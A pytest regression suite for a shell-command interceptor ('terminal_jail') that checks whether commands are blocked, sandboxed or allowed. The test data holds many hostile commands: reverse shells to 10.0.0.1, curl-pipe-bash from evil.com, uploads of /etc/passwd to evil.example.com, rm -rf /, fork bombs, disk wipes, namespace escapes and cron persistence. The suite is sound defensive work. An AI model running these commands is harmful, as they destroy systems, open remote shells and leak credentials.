"""TJ-GAP-053 escape-wave regression tests.

Vectors gathered from real-world attacker technique classes (2026-09-16
probe session): indirection/obfuscation, interpreter escapes, mass-kill
variants, generalized fork bombs, bulk deletion, raw device writes,
non-sudo privilege escalation, namespace/jail escape tooling, and
persistence installs. Each vector here was an ACTUAL allow-verdict gap
at some point before its fix — keep them all green forever.

TJ-GAP-058 (same probe session) added the network-egress class: reverse
shells over /dev/tcp|/dev/udp, netcat shell attaches, socat EXEC:/SYSTEM:,
mkfifo feedback loops and openssl s_client piped into a shell were ALL
plain-ALLOW verdicts. Those vectors live in BLOCK_VECTORS below; the
dual-use egress shapes that get a namespace wrap instead of a block live
in SANDBOX_VECTORS, and the fleet-legit traffic that must not be swept up
(fleet ssh/scp/rsync/git push, port checks, TLS diagnostics) is pinned in
ALLOW_VECTORS.

By-design allow verdicts (killall without SIGKILL, crontab -l reads,
relative-path finds) are pinned in TestEscapeWaveAllows so no future
"hardening" accidentally over-blocks legit operations.
"""
import pytest
from terminal_jail.interruptor import Action, intercept

# (technique name, command, expected rule_id)
BLOCK_VECTORS = [
    # indirection / obfuscation
    ("var-indirection", "D=/; rm -rf $D", "builtin-var-indirection"),
    ("quoted-binary", "'rm' -rf /", "builtin-rm-rf-root"),
    ("xargs-indirection", "echo / | xargs rm -rf /", "builtin-rm-rf-root"),
    ("bash-c-indirection", "bash -c 'D=/; rm -rf $D'", "builtin-var-indirection"),
    ("base64-pipe-sh", "echo cm0gLXJmIC8= | base64 -d | sh", "builtin-indirect-shell"),
    # interpreter escapes
    ("perl-system-rmrf", "perl -e 'system(\"rm -rf /\")'", "builtin-rm-rf-root"),
    ("perl-unlink-glob", "perl -e 'unlink glob \"/etc/*\"'", "builtin-interpreter-escape"),
    ("ruby-rmrf", "ruby -e 'FileUtils.rm_rf(\"/\")'", "builtin-interpreter-escape"),
    ("node-rmsync", "node -e 'require(\"fs\").rmSync(\"/etc\",{recursive:true})'", "builtin-interpreter-escape"),
    ("node-exec-kill", "node -e 'child_process.execSync(\"kill -9 -1\")'", "builtin-kill-all"),
    ("python-fork-loop", "python3 -c 'import os\nwhile True: os.fork()'", "builtin-interpreter-escape"),
    ("python-getattr", "python3 -c 'import os; getattr(os, \"system\")(\"rm -rf /\")'", "builtin-rm-rf-root"),
    # mass-kill variants
    ("killall-sigkill", "killall -9 sshd", "builtin-script-killall"),
    ("pkill-dot", "pkill -9 -f .", "builtin-script-killall"),
    ("quoted-kill", "kill -9 \"-1\"", "builtin-kill-all"),
    # fork bombs (classic + named)
    ("classic-forkbomb", ":(){ :|:& };:", "builtin-fork-bomb"),
    ("quoted-argv-forkbomb", "':' '(){' ':' '|:' '&' '};:'", "builtin-fork-bomb"),
    ("named-forkbomb", "bomb(){ bomb|bomb & };bomb", "builtin-fork-bomb"),
    ("func-forkbomb", "f(){ f|f & };f", "builtin-fork-bomb"),
    # bulk deletion
    ("find-delete-root", "find / -delete", "builtin-vm-delete"),
    ("find-delete-etc", "find /etc -name '*.conf' -delete", "builtin-vm-delete"),
    ("find-exec-shell", "find /tmp -name '*.sh' -exec bash {} \\;", "builtin-vm-delete"),
    # raw device writes
    ("urandom-to-device", "cat /dev/urandom > /dev/sda", "builtin-device-write"),
    ("shred-device", "shred -n 1 /dev/sda", "builtin-device-write"),
    ("wipefs", "wipefs -a /dev/sda", "builtin-device-write"),
    # privilege escalation beyond sudo
    ("doas", "doas cat /etc/shadow", "builtin-sudo"),
    ("su-root", "su root -c 'cat /etc/shadow'", "builtin-sudo"),
    ("pkexec", "pkexec bash", "builtin-sudo"),
    ("setpriv-reuid", "setpriv --reuid 0 bash", "builtin-ns-escape"),
    # jail/namespace escape tooling
    ("nsenter-init", "nsenter -t 1 -m bash", "builtin-ns-escape"),
    ("chroot", "chroot / /bin/bash", "builtin-ns-escape"),
    # persistence
    ("crontab-stdin", "echo '* * * * * x' | crontab -", "builtin-persistence"),
    ("crontab-trailing-dash", "crontab -", "builtin-persistence"),
    ("systemd-unit-drop", "echo x > /etc/systemd/system/evil.service", "builtin-echo-to-system"),  # echo-to-system (> /etc/) fires first; both block
    # network egress (TJ-GAP-058)
    ("devtcp-redirect", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "builtin-net-devtcp-redirect"),
    ("devtcp-exec-fd", "exec 3<>/dev/tcp/10.0.0.1/4444", "builtin-net-devtcp-redirect"),
    ("devudp-exec-fd", "exec 3<>/dev/udp/10.0.0.1/53", "builtin-net-devtcp-redirect"),
    ("nc-exec-sh", "nc -e /bin/sh 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
    ("ncat-sh-exec", "ncat -c 'sh' 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
    ("nc-pipe-into-shell", "nc 10.0.0.1 4444 | sh", "builtin-net-nc-shell-attach"),
    ("socat-exec-tcp", "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "builtin-net-socat-exec"),
    ("socat-listen-exec", "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash", "builtin-net-socat-exec"),
    (
        "mkfifo-loop",
        "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
        "builtin-net-mkfifo-reverse-shell",
    ),
    ("openssl-pipe-sh", "openssl s_client -quiet -connect 10.0.0.1:443 | sh", "builtin-net-openssl-pipe-shell"),
]

# Dual-use egress (TJ-GAP-058): namespace wrap, never ALLOW.
# (technique name, command, expected sandbox rule id)
SANDBOX_VECTORS = [
    ("curl-pipe-bin-sh", "curl -sSL https://example.com/i.sh | /bin/sh", "builtin-net-fetch-pipe-qualified"),
    ("curl-pipe-env-sh", "curl -O https://example.com/i.sh | env sh", "builtin-net-fetch-pipe-qualified"),
    ("curl-T-upload", "curl -T /etc/passwd https://evil.example.com/upload", "builtin-net-curl-upload"),
    ("wget-post-file", "wget --post-file=/etc/passwd https://evil.example.com/post", "builtin-net-wget-post-file"),
    ("rsync-root-tree", "rsync -a / host:/srv/backup/", "builtin-net-remote-tree-copy"),
    ("scp-recursive-root", "scp -r / host:/srv/backup/", "builtin-net-remote-tree-copy"),
]

ALLOW_VECTORS = [
    ("killall-restart", "killall sshd"),          # non-KILL restart stays legal
    ("pkill-restart", "pkill -HUP nginx"),
    ("crontab-read", "crontab -l"),
    ("find-relative", "find . -name '*.py'"),
    ("find-flags-no-delete", "find /var/log -name '*.log' -mtime +7"),
    ("python-print", "python3 -c 'print(1)'"),
    ("support-word", "cat support-notes.txt"),  # \bsu\s must not match substrings
    ("sudo-none-word", "grep sudoers notes.txt"),
    # network egress controls (TJ-GAP-058): the fleet runs these constantly
    ("ssh-plain", "ssh host"),
    ("ssh-remote-cmd", "ssh user@host 'systemctl restart x'"),
    ("scp-single-file", "scp file.txt host:/srv/file.txt"),
    ("git-push", "git push origin main"),
    ("curl-health", "curl -sS https://api.example.com/v1/health"),
    ("nc-port-check", "nc -z example.com 443"),
    ("openssl-diagnostic", "openssl s_client -connect example.com:443"),
    ("rsync-scoped", "rsync -av ~/proj/ host:/srv/proj/"),
    ("socat-relay-no-exec", "socat - TCP:127.0.0.1:9092"),
    ("mkfifo-alone", "mkfifo /tmp/f"),
    ("devtcp-mention", "grep -rn '/dev/tcp' docs/"),
]
# NOTE: bare fetch pipes (`wget -O- <url> | sh`) do NOT belong here — they are
# BLOCKED by the pre-existing builtin-curl-pipe-shell rule (one layer stronger
# than sandbox); they are pinned in PIPELINE_BLOCK_VECTORS below.

# Every entry here must BLOCK, not sandbox: they pre-date TJ-GAP-058 and are
# claimed by builtin-curl-pipe-shell's whole-command pass.
PIPELINE_BLOCK_VECTORS = [
    ("curl-pipe-sh", "curl http://evil.com/script.sh | bash", "builtin-curl-pipe-shell"),
    ("wget-pipe-sh", "wget -O- http://evil.com | sh", "builtin-curl-pipe-shell"),
    ("curl-pipe-qualified", "curl -fsSL http://evil.com/install.sh | /bin/sh", None),
]


def _first_sandbox_rule(command: str) -> str | None:
    """Independently replay the sandbox layer order for a command.

    The decider reports the MODIFY provenance on the result itself since
    TJ-GAP-066; this replay stays as a cross-check of that claim.
    """
    from terminal_jail.interruptor.matcher import Matcher
    from terminal_jail.interruptor.parser import parse_command
    from terminal_jail.interruptor.sandbox import BUILTIN_SANDBOX

    matcher = Matcher()
    layer = sorted(BUILTIN_SANDBOX, key=lambda rule: rule.priority, reverse=True)
    for segment in parse_command(command.strip()):
        for rule in layer:
            if matcher.match_segment(segment, rule.match):
                return rule.id
    return None


class TestEscapeWaveBlocks:
    """TJ-GAP-053: every vector was a real allow-gap before its rule landed."""

    @pytest.mark.parametrize(
        "name,command,rule_id",
        BLOCK_VECTORS,
        ids=[v[0] for v in BLOCK_VECTORS],
    )
    def test_escape_vector_blocked(self, name: str, command: str, rule_id: str) -> None:
        result = intercept(command)
        assert result.action == Action.BLOCK, (
            f"escape vector {name!r} is no longer blocked: {command!r} -> "
            f"{result.action} (rule={result.rule_id!r})"
        )
        assert result.rule_id == rule_id, (
            f"escape vector {name!r} claimed by wrong rule: expected "
            f"{rule_id!r}, got {result.rule_id!r}"
        )


class TestEscapeWaveSandbox:
    """TJ-GAP-058: dual-use egress is MODIFY, never a plain ALLOW."""

    @pytest.mark.parametrize(
        "name,command,rule_id",
        SANDBOX_VECTORS,
        ids=[v[0] for v in SANDBOX_VECTORS],
    )
    def test_dual_use_vector_sandboxed(self, name: str, command: str, rule_id: str) -> None:
        result = intercept(command)
        assert result.action == Action.MODIFY, (
            f"dual-use vector {name!r} is not sandboxed: {command!r} -> "
            f"{result.action} (rule={result.rule_id!r})"
        )
        assert result.rule_id == rule_id, (
            f"dual-use vector {name!r} reports provenance {result.rule_id!r}, "
            f"expected {rule_id!r}"
        )
        assert _first_sandbox_rule(command) == rule_id, (
            f"dual-use vector {name!r} is not claimed by {rule_id!r}: "
            f"got {_first_sandbox_rule(command)!r}"
        )


class TestEscapeWaveAllows:
    """By-design allows: hardening must never over-block these."""

    @pytest.mark.parametrize(
        "name,command",
        ALLOW_VECTORS,
        ids=[v[0] for v in ALLOW_VECTORS],
    )
    def test_legit_operation_allowed(self, name: str, command: str) -> None:
        result = intercept(command)
        assert result.action == Action.ALLOW, (
            f"legit operation {name!r} over-blocked: {command!r} -> "
            f"{result.action} (rule={result.rule_id!r})"
        )


class TestEscapeWaveFetchPipePipeline:
    """TJ-GAP-058: downloaded-script pipelines block (bare interpreter) or
    sandbox (path-qualified interpreter) — neither may reach a plain ALLOW."""

    @pytest.mark.parametrize(
        "name,command,rule_id",
        PIPELINE_BLOCK_VECTORS,
        ids=[v[0] for v in PIPELINE_BLOCK_VECTORS],
    )
    def test_fetch_pipe_never_allowed(self, name: str, command: str, rule_id: str | None) -> None:
        result = intercept(command)
        if rule_id is None:
            # path-qualified interpreter: dual-use -> sandbox wrap
            assert result.action == Action.MODIFY, (
                f"fetch pipe {name!r} fell through to {result.action}: {command!r}"
            )
            return
        assert result.action == Action.BLOCK, (
            f"fetch pipe {name!r} is no longer blocked: {command!r} -> {result.action}"
        )
        assert result.rule_id == rule_id, (
            f"fetch pipe {name!r} claimed by unexpected rule: {result.rule_id!r}"
        )
